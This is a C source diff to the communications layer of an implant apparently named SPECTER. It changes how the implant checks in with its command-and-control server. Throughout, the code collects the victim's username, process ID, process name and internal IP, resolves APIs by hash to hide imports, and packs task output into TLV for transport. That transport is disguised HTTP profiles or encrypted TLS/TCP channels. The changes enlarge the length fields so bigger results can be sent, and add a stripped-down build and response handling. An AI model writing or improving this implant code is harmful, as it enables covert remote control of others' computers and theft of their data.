@@ -140,23 +140,25 @@ static void comms_dev_trace(const char *msg) {
 #define TLV_TASK_ARGS        0x0203
 
 /**
- * Write a single TLV field: [tag: u16 LE][length: u16 LE][value bytes].
+ * Write a single TLV field: [tag: u16 LE][length: u32 LE][value bytes].
  * Returns updated position after the written field.
  */
 /* Global limit set by build_checkin_payload so tlv_put can bounds-check. */
 static DWORD g_tlv_buf_limit = 0;
 
-static DWORD tlv_put(BYTE *buf, DWORD pos, WORD tag, const BYTE *val, WORD val_len) {
-    DWORD needed = pos + 4 + val_len;
+static DWORD tlv_put(BYTE *buf, DWORD pos, WORD tag, const BYTE *val, DWORD val_len) {
+    DWORD needed = pos + 6 + val_len;
     if (g_tlv_buf_limit > 0 && needed > g_tlv_buf_limit)
         return pos; /* refuse to write past buffer — return pos unchanged */
     buf[pos]     = (BYTE)(tag & 0xFF);
     buf[pos + 1] = (BYTE)(tag >> 8);
-    buf[pos + 2] = (BYTE)(val_len & 0xFF);
+    buf[pos + 2] = (BYTE)(val_len);
     buf[pos + 3] = (BYTE)(val_len >> 8);
+    buf[pos + 4] = (BYTE)(val_len >> 16);
+    buf[pos + 5] = (BYTE)(val_len >> 24);
     if (val && val_len > 0)
-        spec_memcpy(buf + pos + 4, val, val_len);
-    return pos + 4 + val_len;
+        spec_memcpy(buf + pos + 6, val, val_len);
+    return pos + 6 + val_len;
 }
 
 /**
@@ -177,7 +179,7 @@ static DWORD tlv_put_u32(BYTE *buf, DWORD pos, WORD tag, DWORD val) {
 static DWORD tlv_put_str(BYTE *buf, DWORD pos, WORD tag, const char *str) {
     DWORD len = 0;
     if (str) { const char *p = str; while (*p) { p++; len++; } }
-    return tlv_put(buf, pos, tag, (const BYTE *)str, (WORD)len);
+    return tlv_put(buf, pos, tag, (const BYTE *)str, len);
 }
 
 /* ------------------------------------------------------------------ */
@@ -232,9 +234,13 @@ static DWORD gather_username(char *buf, DWORD buf_len) {
  * Gather current PID from TEB (GS:0x30 -> TEB, +0x40 -> ClientId.UniqueProcess).
  */
 static DWORD gather_pid(void) {
+#ifdef TEST_BUILD
+    return 0;
+#else
     PVOID teb;
     __asm__ volatile ("mov %0, gs:[0x30]" : "=r" (teb));
     return (DWORD)(QWORD)(*(PVOID *)((PBYTE)teb + 0x40));
+#endif
 }
 
 /**
@@ -280,6 +286,13 @@ static DWORD gather_os_version(char *buf, DWORD buf_len) {
 static DWORD gather_process_name(char *buf, DWORD buf_len) {
     if (!buf || buf_len < 2) return 0;
 
+#ifdef TEST_BUILD
+    const char test_name[] = "specter-test";
+    DWORD out_len = (sizeof(test_name) - 1 < buf_len - 1) ? sizeof(test_name) - 1 : buf_len - 1;
+    spec_memcpy(buf, test_name, out_len);
+    buf[out_len] = '\0';
+    return out_len;
+#else
     /* TEB -> PEB -> Ldr -> InLoadOrderModuleList -> first entry -> BaseDllName */
     PVOID teb;
     __asm__ volatile ("mov %0, gs:[0x30]" : "=r" (teb));
@@ -303,6 +316,7 @@ static DWORD gather_process_name(char *buf, DWORD buf_len) {
     }
     buf[out_len] = '\0';
     return out_len;
+#endif
 }
 
 /**
@@ -455,10 +469,13 @@ static void parse_checkin_response(IMPLANT_CONTEXT *impl_ctx, COMMS_CONTEXT *com
     if (len < 1 || data[0] != CHECKIN_TLV_VERSION) return;
 
     DWORD pos = 1;
-    while (pos + 4 <= len) {
+    while (pos + 6 <= len) {
         WORD tag  = (WORD)data[pos] | ((WORD)data[pos + 1] << 8);
-        WORD vlen = (WORD)data[pos + 2] | ((WORD)data[pos + 3] << 8);
-        pos += 4;
+        DWORD vlen = (DWORD)data[pos + 2] |
+                     ((DWORD)data[pos + 3] << 8) |
+                     ((DWORD)data[pos + 4] << 16) |
+                     ((DWORD)data[pos + 5] << 24);
+        pos += 6;
         if (pos + vlen > len) break;
 
         switch (tag) {
@@ -480,10 +497,13 @@ static void parse_checkin_response(IMPLANT_CONTEXT *impl_ctx, COMMS_CONTEXT *com
             DWORD type_len = 0;
             spec_memset(type_buf, 0, sizeof(type_buf));
 
-            while (bpos + 4 <= vlen) {
+            while (bpos + 6 <= vlen) {
                 WORD btag  = (WORD)block[bpos] | ((WORD)block[bpos + 1] << 8);
-                WORD blen  = (WORD)block[bpos + 2] | ((WORD)block[bpos + 3] << 8);
-                bpos += 4;
+                DWORD blen = (DWORD)block[bpos + 2] |
+                             ((DWORD)block[bpos + 3] << 8) |
+                             ((DWORD)block[bpos + 4] << 16) |
+                             ((DWORD)block[bpos + 5] << 24);
+                bpos += 6;
                 if (bpos + blen > vlen) break;
 
                 switch (btag) {
@@ -575,6 +595,9 @@ static NTSTATUS comms_resolve_apis(COMMS_API *api) {
         !api->pGetaddrinfo || !api->pFreeaddrinfo)
         return (NTSTATUS)0xC0000163; /* 163 = ws2_32 export missing */
 
+#ifdef SPECTER_BAREBONE
+    api->tls_available = FALSE;
+#else
     /* Resolve secur32.dll (may forward to sspicli.dll) */
     PVOID sec = find_module_by_hash(HASH_SECUR32_DLL);
     if (!sec)
@@ -606,6 +629,7 @@ static NTSTATUS comms_resolve_apis(COMMS_API *api) {
                           api->pDecryptMessage &&
                           api->pQueryContextAttributesA &&
                           api->pFreeContextBuffer);
+#endif
 
     api->resolved = TRUE;
     return STATUS_SUCCESS;
@@ -723,6 +747,11 @@ NTSTATUS comms_tcp_close(COMMS_CONTEXT *ctx) {
 __attribute__((weak))
 #endif
 NTSTATUS comms_tls_init(COMMS_CONTEXT *ctx) {
+#ifdef SPECTER_BAREBONE
+    if (!ctx) return STATUS_INVALID_PARAMETER;
+    ctx->api.tls_available = FALSE;
+    return STATUS_SUCCESS;
+#else
     if (!ctx) return STATUS_INVALID_PARAMETER;
 
     COMMS_API *api = &ctx->api;
@@ -746,12 +775,19 @@ NTSTATUS comms_tls_init(COMMS_CONTEXT *ctx) {
         return STATUS_UNSUCCESSFUL;
 
     return STATUS_SUCCESS;
+#endif
 }
 
 #ifdef TEST_BUILD
 __attribute__((weak))
 #endif
 NTSTATUS comms_tls_handshake(COMMS_CONTEXT *ctx, const char *hostname) {
+#ifdef SPECTER_BAREBONE
+    (void)hostname;
+    if (!ctx) return STATUS_INVALID_PARAMETER;
+    ctx->state = COMMS_STATE_ERROR;
+    return STATUS_UNSUCCESSFUL;
+#else
     if (!ctx || !hostname) return STATUS_INVALID_PARAMETER;
 
     COMMS_API *api = &ctx->api;
@@ -859,12 +895,16 @@ NTSTATUS comms_tls_handshake(COMMS_CONTEXT *ctx, const char *hostname) {
 
     ctx->state = COMMS_STATE_TLS_CONNECTED;
     return STATUS_SUCCESS;
+#endif
 }
 
 #ifdef TEST_BUILD
 __attribute__((weak))
 #endif
 NTSTATUS comms_tls_send(COMMS_CONTEXT *ctx, const BYTE *data, DWORD len) {
+#ifdef SPECTER_BAREBONE
+    return comms_tcp_send(ctx, data, len);
+#else
     if (!ctx || !data || len == 0) return STATUS_INVALID_PARAMETER;
     if (!ctx->context_valid) return STATUS_INVALID_HANDLE;
 
@@ -914,12 +954,16 @@ NTSTATUS comms_tls_send(COMMS_CONTEXT *ctx, const BYTE *data, DWORD len) {
         sent += chunk;
     }
     return STATUS_SUCCESS;
+#endif
 }
 
 #ifdef TEST_BUILD
 __attribute__((weak))
 #endif
 NTSTATUS comms_tls_recv(COMMS_CONTEXT *ctx, BYTE *buf, DWORD buf_len, DWORD *received) {
+#ifdef SPECTER_BAREBONE
+    return comms_tcp_recv(ctx, buf, buf_len, received);
+#else
     if (!ctx || !buf || buf_len == 0 || !received) return STATUS_INVALID_PARAMETER;
     if (!ctx->context_valid) return STATUS_INVALID_HANDLE;
 
@@ -980,12 +1024,16 @@ NTSTATUS comms_tls_recv(COMMS_CONTEXT *ctx, BYTE *buf, DWORD buf_len, DWORD *rec
     }
 
     return STATUS_SUCCESS;
+#endif
 }
 
 #ifdef TEST_BUILD
 __attribute__((weak))
 #endif
 NTSTATUS comms_tls_close(COMMS_CONTEXT *ctx) {
+#ifdef SPECTER_BAREBONE
+    return comms_tcp_close(ctx);
+#else
     if (!ctx) return STATUS_INVALID_PARAMETER;
 
     COMMS_API *api = &ctx->api;
@@ -1023,6 +1071,7 @@ NTSTATUS comms_tls_close(COMMS_CONTEXT *ctx) {
 
     api->pFreeCredentialsHandle(&ctx->cred_handle);
     return comms_tcp_close(ctx);
+#endif
 }
 
 /* ------------------------------------------------------------------ */
@@ -1116,6 +1165,53 @@ static DWORD find_header_end(const BYTE *data, DWORD len) {
             return i + 4;
     }
     return 0;
+}
+
+static BOOL header_name_matches(const BYTE *line, DWORD len, const char *name) {
+    DWORD i = 0;
+    while (name[i] && i < len) {
+        BYTE c = line[i];
+        BYTE n = (BYTE)name[i];
+        if (c >= 'A' && c <= 'Z') c = (BYTE)(c + 32);
+        if (n >= 'A' && n <= 'Z') n = (BYTE)(n + 32);
+        if (c != n) return FALSE;
+        i++;
+    }
+    return name[i] == 0 && i < len && line[i] == ':';
+}
+
+static BOOL parse_content_length_header(const BYTE *data, DWORD header_end, DWORD *content_len) {
+    DWORD line_start = 0;
+    if (!data || !content_len || header_end == 0) return FALSE;
+
+    while (line_start + 2 < header_end && data[line_start] != '\r')
+        line_start++;
+    line_start += 2;
+
+    while (line_start + 2 < header_end) {
+        DWORD line_end = line_start;
+        while (line_end < header_end && data[line_end] != '\r')
+            line_end++;
+        if (line_end <= line_start)
+            break;
+
+        if (header_name_matches(data + line_start, line_end - line_start, "content-length")) {
+            DWORD pos = line_start + 15;
+            DWORD value = 0;
+            while (pos < line_end && (data[pos] == ':' || data[pos] == ' ' || data[pos] == '\t'))
+                pos++;
+            while (pos < line_end && data[pos] >= '0' && data[pos] <= '9') {
+                value = (value * 10) + (DWORD)(data[pos] - '0');
+                pos++;
+            }
+            *content_len = value;
+            return TRUE;
+        }
+
+        line_start = line_end + 2;
+    }
+
+    return FALSE;
 }
 
 /**
@@ -1227,7 +1323,7 @@ NTSTATUS comms_http_parse_response(const BYTE *data, DWORD data_len,
 /**
  * Build a TLV-encoded check-in payload with host information and task results.
  * Wire format: [1-byte version = 0x01][TLV fields...]
- * Each TLV: [2-byte LE tag][2-byte LE length][value bytes]
+ * Each TLV: [2-byte LE tag][4-byte LE length][value bytes]
  * Returns total payload size, or 0 on error.
  */
 static DWORD build_checkin_payload(IMPLANT_CONTEXT *impl_ctx, IMPLANT_CONFIG *cfg,
@@ -1286,30 +1382,37 @@ static DWORD build_checkin_payload(IMPLANT_CONTEXT *impl_ctx, IMPLANT_CONFIG *cf
         pos = tlv_put_str(out, pos, TLV_INTERNAL_IP, ip_buf);
 
     /* Task results — include completed/failed task results from previous cycle.
-     * Each result is serialized as a nested TLV block (TASK_RESULT).
-     * Result data is capped at 0xFFF0 bytes to fit TLV u16 length field. */
+     * Each result is serialized as a nested TLV block (TASK_RESULT). */
     if (impl_ctx) {
         for (DWORD i = 0; i < impl_ctx->task_result_count; i++) {
             TASK_RESULT *r = &impl_ctx->task_results[i];
 
-            /* Cap result data to fit in TLV u16 length, leaving room for
-             * the nested TASK_ID + STATUS headers (~100 bytes overhead) */
             DWORD data_cap = r->data_len;
-            if (data_cap > 0xFF00) data_cap = 0xFF00;
+            DWORD status = r->status;
+            const BYTE *data = r->data;
+            char s_oversized[] = {
+                'r','e','s','u','l','t',' ','t','o','o',' ','l','a','r','g','e',
+                ' ','f','o','r',' ','c','h','e','c','k','-','i','n'
+            };
 
-            /* Compute nested size: TASK_ID(4+id_len) + STATUS(4+8) + DATA(4+data_cap) */
+            /* Compute nested size: TASK_ID(6+id_len) + STATUS(6+8) + DATA(6+data_cap) */
             DWORD id_len = spec_strlen(r->task_id);
-            DWORD nested_size = (4 + id_len) + (4 + 8) + (4 + data_cap);
-            if (nested_size > 0xFFFF) nested_size = 0xFFFF;
+            DWORD nested_size = (6 + id_len) + (6 + 8) + (6 + data_cap);
 
-            /* Check if there's room in the output buffer */
-            if (pos + 4 + nested_size > out_len) break;
+            if (pos + 6 + nested_size > out_len) {
+                status = TASK_STATUS_FAILED;
+                data = (const BYTE *)s_oversized;
+                data_cap = (DWORD)sizeof(s_oversized);
+                nested_size = (6 + id_len) + (6 + 6) + (6 + data_cap);
+                if (pos + 6 + nested_size > out_len)
+                    return 0;
+            }
 
             /* Build nested TLV in-place: write TASK_RESULT header first
              * with placeholder length, then fill, then fix length */
             DWORD result_start = pos;
-            /* Reserve 4 bytes for TASK_RESULT TLV header */
-            pos += 4;
+            /* Reserve 6 bytes for TASK_RESULT TLV header */
+            pos += 6;
 
             /* RESULT_TASK_ID */
             pos = tlv_put_str(out, pos, TLV_RESULT_TASK_ID, r->task_id);
@@ -1318,23 +1421,25 @@ static DWORD build_checkin_payload(IMPLANT_CONTEXT *impl_ctx, IMPLANT_CONFIG *cf
             {
                 char s_complete[] = {'C','O','M','P','L','E','T','E',0};
                 char s_failed[]   = {'F','A','I','L','E','D',0};
-                const char *status_str = (r->status == 0) ? s_complete : s_failed;
+                const char *status_str = (status == 0) ? s_complete : s_failed;
                 pos = tlv_put_str(out, pos, TLV_RESULT_STATUS, status_str);
             }
 
             /* RESULT_DATA */
-            if (r->data && data_cap > 0) {
-                pos = tlv_put(out, pos, TLV_RESULT_DATA, r->data, (WORD)data_cap);
+            if (data && data_cap > 0) {
+                pos = tlv_put(out, pos, TLV_RESULT_DATA, data, data_cap);
             } else {
                 pos = tlv_put(out, pos, TLV_RESULT_DATA, NULL, 0);
             }
 
             /* Patch the TASK_RESULT TLV header with actual nested length */
-            DWORD nested_len = pos - result_start - 4;
+            DWORD nested_len = pos - result_start - 6;
             out[result_start]     = (BYTE)(TLV_TASK_RESULT & 0xFF);
             out[result_start + 1] = (BYTE)(TLV_TASK_RESULT >> 8);
-            out[result_start + 2] = (BYTE)(nested_len & 0xFF);
+            out[result_start + 2] = (BYTE)(nested_len);
             out[result_start + 3] = (BYTE)(nested_len >> 8);
+            out[result_start + 4] = (BYTE)(nested_len >> 16);
+            out[result_start + 5] = (BYTE)(nested_len >> 24);
         }
     }
 
@@ -1423,15 +1528,22 @@ NTSTATUS comms_checkin(IMPLANT_CONTEXT *ctx) {
 
     /* ---- Build plaintext TLV payload (heap) ---- */
     COMMS_TRACE("[SPECTER] checkin: build_payload...");
+    /* Cap plaintext check-in TLV buffer to limit heap growth from huge task results */
+    const DWORD checkin_payload_cap = 4u * 1024u * 1024u;
     payload_buf_size = 1024;
     if (ctx->task_result_count > 0) {
         DWORD needed = 512;
         for (DWORD ri = 0; ri < ctx->task_result_count; ri++) {
-            needed += 128 + ctx->task_results[ri].data_len;
+            DWORD chunk = 128u + ctx->task_results[ri].data_len;
+            if (needed > checkin_payload_cap - chunk)
+                needed = checkin_payload_cap;
+            else
+                needed += chunk;
         }
         if (needed > payload_buf_size) payload_buf_size = needed;
-        if (payload_buf_size > 0xFFFF) payload_buf_size = 0xFFFF;
     }
+    if (payload_buf_size > checkin_payload_cap)
+        payload_buf_size = checkin_payload_cap;
     payload = (BYTE *)heap_alloc_cached(payload_buf_size);
     if (!payload) { status = STATUS_NO_MEMORY; goto cleanup; }
 
@@ -1448,11 +1560,14 @@ NTSTATUS comms_checkin(IMPLANT_CONTEXT *ctx) {
     if (!http_buf) { status = STATUS_NO_MEMORY; goto cleanup; }
     DWORD http_len = 0;
 
+#ifndef SPECTER_BAREBONE
     if (comms->profile && comms->profile->initialized) {
         /* ============== Profile-driven path ============== */
+        COMMS_TRACE("[SPECTER] checkin: profile wire path");
         PROFILE_CONFIG *prof = comms->profile;
 
         /* Step 1: transform_send (heap buffer) */
+        COMMS_TRACE("[SPECTER] checkin: profile transform_send");
         DWORD transform_buf_size = payload_len + 4096;
         if (transform_buf_size < TRANSFORM_MAX_OUTPUT)
             transform_buf_size = TRANSFORM_MAX_OUTPUT;
@@ -1467,6 +1582,7 @@ NTSTATUS comms_checkin(IMPLANT_CONTEXT *ctx) {
         if (!NT_SUCCESS(status)) goto cleanup;
 
         /* Step 2: profile_embed_data (heap buffer) */
+        COMMS_TRACE("[SPECTER] checkin: profile embed_data");
         DWORD body_heap_size = 4096;
         body_heap = (BYTE *)heap_alloc_cached(body_heap_size);
         if (!body_heap) { status = STATUS_NO_MEMORY; goto cleanup; }
@@ -1476,6 +1592,7 @@ NTSTATUS comms_checkin(IMPLANT_CONTEXT *ctx) {
         if (embed_body_len == 0) { status = STATUS_UNSUCCESSFUL; goto cleanup; }
 
         /* Step 3: profile_build_headers (heap buffer) */
+        COMMS_TRACE("[SPECTER] checkin: profile build_headers");
         DWORD headers_heap_size = 2048;
         headers_heap = (BYTE *)heap_alloc_cached(headers_heap_size);
         if (!headers_heap) { status = STATUS_NO_MEMORY; goto cleanup; }
@@ -1484,9 +1601,11 @@ NTSTATUS comms_checkin(IMPLANT_CONTEXT *ctx) {
         (void)headers_len;
 
         /* Step 4: profile_get_uri */
+        COMMS_TRACE("[SPECTER] checkin: profile get_uri");
         const char *uri = profile_get_uri(prof);
 
         /* Step 5: Build HTTP request */
+        COMMS_TRACE("[SPECTER] checkin: profile build_request");
         DWORD method = profile_get_method(prof);
         http_len = comms_http_build_request(
             method, uri, ch->url,
@@ -1499,8 +1618,11 @@ NTSTATUS comms_checkin(IMPLANT_CONTEXT *ctx) {
         heap_free_cached(transformed);  transformed = NULL;
 
         if (http_len == 0) { status = STATUS_UNSUCCESSFUL; goto cleanup; }
+        COMMS_TRACE("[SPECTER] checkin: profile HTTP request built, sending...");
 
-    } else {
+    } else
+#endif
+    {
         /* ============== Legacy wire format path ============== */
         COMMS_TRACE("[SPECTER] checkin: legacy wire path");
         spec_memset(payload, 0, payload_buf_size);
@@ -1574,8 +1696,19 @@ NTSTATUS comms_checkin(IMPLANT_CONTEXT *ctx) {
         if (!NT_SUCCESS(status)) goto cleanup;
         resp_total += got;
 
-        if (find_header_end(resp_buf, resp_total) > 0)
-            break;
+        DWORD header_end = find_header_end(resp_buf, resp_total);
+        if (header_end > 0) {
+            DWORD content_len = 0;
+            if (!parse_content_length_header(resp_buf, header_end, &content_len)) {
+                COMMS_TRACE("[SPECTER] checkin: response has no content-length");
+                break;
+            }
+            if (resp_total >= header_end + content_len) {
+                COMMS_TRACE("[SPECTER] checkin: response body complete");
+                break;
+            }
+            COMMS_TRACE("[SPECTER] checkin: waiting for response body");
+        }
     }
 
     /* ---- Parse HTTP response ---- */
@@ -1591,6 +1724,7 @@ NTSTATUS comms_checkin(IMPLANT_CONTEXT *ctx) {
 
     /* ---- Process response body ---- */
     if (body && body_len > 0) {
+#ifndef SPECTER_BAREBONE
         if (comms->profile && comms->profile->initialized) {
             /* Profile-driven: extract -> transform_recv (all heap) */
             extracted = (BYTE *)heap_alloc_cached(4096);
@@ -1599,6 +1733,7 @@ NTSTATUS comms_checkin(IMPLANT_CONTEXT *ctx) {
                 DWORD extract_ret = profile_extract_data(comms->profile, body, body_len,
                                                           extracted, &extracted_len);
                 if (extract_ret > 0 && extracted_len > 0) {
+                    COMMS_TRACE("[SPECTER] checkin: profile response extracted");
                     resp_plain = (BYTE *)heap_alloc_cached(4096);
                     if (resp_plain) {
                         DWORD resp_plain_len = 0;
@@ -1608,13 +1743,25 @@ NTSTATUS comms_checkin(IMPLANT_CONTEXT *ctx) {
                                                  resp_plain, &resp_plain_len,
                                                  4096);
                         if (NT_SUCCESS(status) && resp_plain_len > 0) {
+                            COMMS_TRACE("[SPECTER] checkin: profile response transform OK");
                             parse_checkin_response(ctx, comms, resp_plain, resp_plain_len);
+                            if (ctx->pending_task_count > 0) {
+                                COMMS_TRACE("[SPECTER] checkin: profile response queued task");
+                            } else {
+                                COMMS_TRACE("[SPECTER] checkin: profile response no tasks");
+                            }
+                        } else {
+                            COMMS_TRACE("[SPECTER] checkin: profile response transform failed");
                         }
                         spec_memset(resp_plain, 0, 4096);
                     }
+                } else {
+                    COMMS_TRACE("[SPECTER] checkin: profile response extract empty");
                 }
             }
-        } else if (body_len > COMMS_WIRE_LEN_SIZE + COMMS_WIRE_HEADER_SIZE + COMMS_WIRE_TAG_SIZE) {
+        } else
+#endif
+        if (body_len > COMMS_WIRE_LEN_SIZE + COMMS_WIRE_HEADER_SIZE + COMMS_WIRE_TAG_SIZE) {
             /* Legacy wire format:
                [4-byte LE len][12-byte server_id][12-byte nonce][ciphertext][16-byte tag] */
             DWORD resp_wire_len = load32_le_comms(body);
@@ -1623,8 +1770,8 @@ NTSTATUS comms_checkin(IMPLANT_CONTEXT *ctx) {
             const BYTE *resp_ct = body + COMMS_WIRE_LEN_SIZE + COMMS_WIRE_HEADER_SIZE;
             const BYTE *resp_tag = resp_ct + resp_ct_len;
 
-            if (resp_ct_len <= 512) {
-                resp_plain = (BYTE *)heap_alloc_cached(512);
+            if (resp_ct_len <= COMMS_RECV_BUF_SIZE) {
+                resp_plain = (BYTE *)heap_alloc_cached(resp_ct_len);
                 if (resp_plain) {
                     BOOL ok = spec_aead_decrypt(comms->session_key, resp_nonce,
                                                  resp_ct, resp_ct_len, NULL, 0,
@@ -1632,7 +1779,7 @@ NTSTATUS comms_checkin(IMPLANT_CONTEXT *ctx) {
                     if (ok) {
                         parse_checkin_response(ctx, comms, resp_plain, resp_ct_len);
                     }
-                    spec_memset(resp_plain, 0, 512);
+                    spec_memset(resp_plain, 0, resp_ct_len);
                 }
             }
         }
